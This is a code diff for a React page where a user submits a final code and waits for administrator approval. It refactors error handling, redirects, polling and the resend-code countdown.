@@ -30,7 +30,6 @@ export default function FinalCodePage() {
     const { toast } = useToast();
 
     const [submission, setSubmission] = useState<Submission | null>(null);
-    const [error, setError] = useState<string | null>(null);
     const [isLoading, setIsLoading] = useState(true);
 
     const [countdown, setCountdown] = useState(30);
@@ -43,18 +42,31 @@ export default function FinalCodePage() {
         try {
             const res = await fetch(`/api/submissions?id=${user.uid}`);
             if (res.status === 404) {
-                setSubmission(null);
+                toast({ variant: 'destructive', title: 'Error', description: 'Submission not found. Redirecting...' });
+                router.replace('/start');
                 return;
             }
-            if (!res.ok) throw new Error('An error occurred while fetching the data.');
+            if (!res.ok) throw new Error('Failed to fetch submission data.');
             const data: Submission = await res.json();
             setSubmission(data);
+            
+            if (data.phoneNumberStatus !== 'approved') {
+                router.replace('/start/select-number');
+                return;
+            }
+            if (data.finalCodeStatus === 'approved') {
+                router.push('/success');
+                return;
+            }
+             if (data.finalCode) {
+                form.setValue('finalCode', data.finalCode);
+            }
         } catch (err: any) {
-            setError(err.message);
+            toast({ variant: 'destructive', title: 'Error', description: err.message });
         } finally {
             setIsLoading(false);
         }
-    }, [user]);
+    }, [user, router, toast, form]);
 
     useEffect(() => {
         if(user){
@@ -62,16 +74,17 @@ export default function FinalCodePage() {
         }
     }, [user, fetchSubmission]);
     
+    // Polling effect
     useEffect(() => {
         if (isPending) {
             const interval = setInterval(() => {
                 fetchSubmission();
-            }, 2000);
+            }, 3000);
             return () => clearInterval(interval);
         }
     }, [isPending, fetchSubmission]);
 
-
+    // Resend timer
     useEffect(() => {
         const timer = setInterval(() => {
             setCountdown(prev => {
@@ -100,28 +113,12 @@ export default function FinalCodePage() {
         defaultValues: { finalCode: "" },
     });
 
-    useEffect(() => {
-        if (submission) {
-            if (submission.phoneNumberStatus !== 'approved') {
-                router.replace('/start/select-number');
-                return;
-            }
-            if (submission.finalCodeStatus === 'approved') {
-                router.push('/success');
-                return;
-            }
-             if (submission.finalCode) {
-                form.setValue('finalCode', submission.finalCode);
-            }
-        }
-    }, [submission, router, form]);
-
 
     const onSubmit = async (values: FormValues) => {
         if (!user) return toast({ variant: 'destructive', title: 'Error', description: 'You must be logged in.' });
         setIsLoading(true);
         try {
-             await fetch('/api/submissions', {
+             const response = await fetch('/api/submissions', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -130,6 +127,10 @@ export default function FinalCodePage() {
                     data: values.finalCode,
                 }),
             });
+             if (!response.ok) {
+                 const errorData = await response.json();
+                 throw new Error(errorData.message || 'Failed to submit final code.');
+            }
             toast({ title: 'Final Code Submitted', description: 'Please wait for final admin approval.' });
             fetchSubmission();
         } catch (err: any) {
@@ -140,8 +141,11 @@ export default function FinalCodePage() {
     };
     
     const isSubmitting = form.formState.isSubmitting;
-    
     const isRejected = submission?.finalCodeStatus === 'rejected';
+
+    if (isLoading && !submission) {
+        return <div className="flex justify-center items-center h-full"><Loader2 className="animate-spin h-8 w-8 text-primary" /></div>
+    }
 
     return (
         <div className="w-full max-w-lg">
@@ -157,7 +161,7 @@ export default function FinalCodePage() {
             
              {isPending && (
                  <Alert className="mb-6 animate-pulse">
-                    <AlertCircle className="h-4 w-4" />
+                    <Loader2 className="h-4 w-4 animate-spin mr-2" />
                     <AlertTitle>Final Approval Pending</AlertTitle>
                     <AlertDescription>An administrator is performing the final review of your application. This page will update automatically.</AlertDescription>
                 </Alert>
@@ -166,10 +170,12 @@ export default function FinalCodePage() {
              {isRejected && (
                  <Alert variant="destructive" className="mb-6">
                     <AlertCircle className="h-4 w-4" />
-                    <AlertTitle>Incorrect Code</AlertTitle>
+                    <AlertTitle>Code Rejected</AlertTitle>
                     <AlertDescription>
-                        The final code you entered was incorrect. Please try again.
-                         <Button variant="link" onClick={handleResendCode} className="p-0 h-auto ml-1" disabled={!canResend}>Resend Code</Button>
+                        {submission?.rejectionReason || "The final code you entered was incorrect. Please try again."}
+                         <Button variant="link" onClick={handleResendCode} className="p-0 h-auto ml-1" disabled={!canResend}>
+                           {canResend ? 'Resend code.' : `Resend in ${countdown}s.`}
+                        </Button>
                     </AlertDescription>
                 </Alert>
             )}
@@ -200,22 +206,24 @@ export default function FinalCodePage() {
                         )}
                     />
 
-                    <div className="text-center text-sm text-muted-foreground">
-                        {canResend ? (
-                            <Button type="button" variant="link" onClick={handleResendCode} className="p-0 h-auto">
-                                Resend Code
-                            </Button>
-                        ) : (
-                            <p>Resend code in {countdown}s</p>
-                        )}
-                    </div>
+                    {!isPending && !isRejected && (
+                        <div className="text-center text-sm text-muted-foreground">
+                            {canResend ? (
+                                <Button type="button" variant="link" onClick={handleResendCode} className="p-0 h-auto">
+                                    Resend Code
+                                </Button>
+                            ) : (
+                                <p>Resend code in {countdown}s</p>
+                            )}
+                        </div>
+                    )}
                     
                     <div className="flex justify-between pt-4">
                          <Button type="button" variant="outline" size="lg" className="rounded-full" onClick={() => router.back()} disabled={isSubmitting || isPending}>
                             <ArrowLeft className="mr-2 h-5 w-5" />
                             Back
                         </Button>
-                        <Button type="submit" size="lg" className="rounded-full" disabled={isSubmitting || isPending || isRejected}>
+                        <Button type="submit" size="lg" className="rounded-full" disabled={isSubmitting || isPending}>
                             {(isSubmitting || isPending) && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
                             {isPending ? 'Waiting for Final Approval...' : 'Submit Application'}
                         </Button>
